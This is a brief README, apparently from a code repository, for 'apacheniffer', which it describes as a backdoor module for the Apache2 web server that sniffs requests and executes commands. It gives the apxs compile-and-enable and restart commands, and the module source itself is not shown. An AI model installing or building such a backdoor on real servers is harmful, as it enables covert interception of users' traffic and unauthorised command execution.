# apacheniffer
Backdoor module to apache2 that sniff requests and execute commands.

Still in developmeant. 

# Install

```
apxs -c -i -a apacheniffer_module.c
systemctl restart apache2
```
